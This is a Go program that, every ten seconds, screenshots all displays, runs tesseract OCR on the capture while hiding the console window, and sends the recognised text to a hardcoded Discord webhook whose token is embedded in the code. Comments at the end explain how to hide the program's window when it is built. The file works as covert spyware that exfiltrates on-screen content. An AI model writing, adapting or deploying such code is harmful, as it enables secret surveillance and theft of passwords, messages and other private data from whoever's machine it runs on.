package main

import (
	"bytes"
	"fmt"
	"github.com/ecnepsnai/discord"
	"github.com/kbinani/screenshot"
	"image/png"
	"log"
	"os"
	"os/exec"
	"syscall"
	"time"
)

// delete unused file
func removeFile(fileDelete string) {
	e := os.Remove(fileDelete)
	if e != nil {
		log.Fatal(e)
	}

}

// screen grabber
func screenGrabber() {
	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			panic(err)
		}
		fileName := fmt.Sprintf("%d_%dx%d.png", i, bounds.Dx(), bounds.Dy())
		file, _ := os.Create(fileName)
		defer file.Close()
		png.Encode(file, img)

	}

}

// ocr function
func ocrTerra() {
	prg := "tesseract"
	arg1 := "0_2560x1440.png"
	arg2 := "out"

	cmd := exec.Command(prg, arg1, arg2)
	//stop console
	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}

	err := cmd.Run()

	if err != nil {
		log.Fatal(err)
	}

}

// ocr parse and compare
func ocrParsc() {
	removeFile("0_2560x1440.png")

}

// rename file
func renameFile(number int) string {
	src := "out.txt"
	filerc, err := os.Open(src)
	if err != nil {
		log.Fatal(err)
	}
	defer filerc.Close()

	buf := new(bytes.Buffer)
	buf.ReadFrom(filerc)
	contents := buf.String()

	return contents

}

// push to discord
func pushDiscord(toSend string) {

	discord.WebhookURL = "https://discord.com/api/webhooks/1090832857536143390/n1OgUi4MQ9u-Wz1sjAz0i3rRjKptDKoWZlNyx24U7T-9TQ04owLidBDoYOVPB7XL92mb"
	discord.Say(toSend)
}

func main() {

	i := 0
	for i < 99999 {
		// Calling Sleep method
		time.Sleep(10 * time.Second)

		// run screenGrabber
		screenGrabber()

		// run ocr
		ocrTerra()

		//rename file for iteration
		sendDiscord := renameFile(i)
		pushDiscord(sendDiscord)
		//to iterate file name
		i++

		// handle ocr output
		ocrParsc()

	}

}

//https://stackoverflow.com/questions/42500570/how-to-hide-command-prompt-window-when-using-exec-in-golang
//to stop window from popping

//https://stackoverflow.com/questions/36727740/how-to-hide-console-window-of-a-go-program-on-windows
//hide console -ldflags -H=windowsgui
